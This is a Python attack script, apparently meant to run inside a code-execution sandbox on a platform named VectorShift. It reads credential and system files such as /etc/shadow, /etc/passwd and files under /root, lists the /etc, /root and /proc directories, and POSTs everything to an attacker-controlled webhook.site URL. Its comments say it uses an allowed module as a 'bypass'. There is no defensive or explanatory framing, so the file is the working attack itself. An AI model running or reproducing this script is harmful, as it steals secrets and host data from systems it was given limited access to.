import requests
import pathlib

def execute_requests(input_url):
    attacker_server = input_url.strip() if input_url and isinstance(input_url, str) and len(input_url) > 5 else "https://webhook.site/0698b39e-c6ca-4f08-a02b-14ceb53b4b63"

    # Target sensitive system files
    target_files = [
        "/etc/shadow", "/etc/passwd", "/etc/os-release", "/etc/hostname",
        "/root/.bashrc", "/root/.profile", "/root/code_executor_modal.py",
        "/proc/net/route", "/proc/net/tcp", "/proc/cpuinfo", "/proc/version"
    ]
    target_dirs = ["/etc/", "/root/", "/proc/"]

    data_payload = {
        "target_host": "VectorShift_Container",
        "file_data": {},
        "directory_listing": {},
        "errors": []
    }
    logs = []

    # Bypass function using allowed pathlib module
    def safe_read(path):
        try:
            p = pathlib.Path(path)
            if p.exists() and p.is_file():
                return p.read_text(encoding='utf-8', errors='replace')
            elif p.is_symlink():
                return str(p.resolve())
        except Exception as e:
            return f"Error: {str(e)}"
        return "Not Found"

    def list_directory(dir_path, max_items=50):
        try:
            p = pathlib.Path(dir_path)
            if p.exists() and p.is_dir():
                items = []
                for item in p.iterdir():
                    items.append(str(item.resolve()))
                    if len(items) >= max_items:
                        break
                return items
        except Exception as e:
            return [f"Error: {str(e)}"]
        return ["Not Found"]

    # Collect sensitive files
    logs.append("[*] Collecting static and sensitive files...")
    for filepath in target_files:
        content = safe_read(filepath)
        if content and "Not Found" not in content:
            data_payload['file_data'][filepath] = content
            logs.append(f"[+] Collected: {filepath}")
        else:
            logs.append(f"[-] Missing: {filepath}")

    # Enumerate directories
    logs.append("[*] Enumerating target directories...")
    for dir_path in target_dirs:
        items = list_directory(dir_path)
        if items and "Not Found" not in items:
            data_payload['directory_listing'][dir_path] = items
            logs.append(f"[+] Enumerated: {dir_path} ({len(items)} items)")
        else:
            logs.append(f"[-] Failed to enumerate: {dir_path}")

    # Exfiltrate data
    try:
        logs.append(f"[*] Exfiltrating data to {attacker_server}...")
        r = requests.post(attacker_server, json=data_payload, timeout=15)
        if r.status_code == 200:
            return {"scan_results": f"SUCCESS: Data exfiltrated.\nLogs:\n" + "\n".join(logs)}
        else:
            return {"scan_results": f"FAILED: Webhook error {r.status_code}\n" + "\n".join(logs)}
    except Exception as e:
        return {"scan_results": f"EGRESS ERROR: {str(e)}\nLogs:\n" + "\n".join(logs)}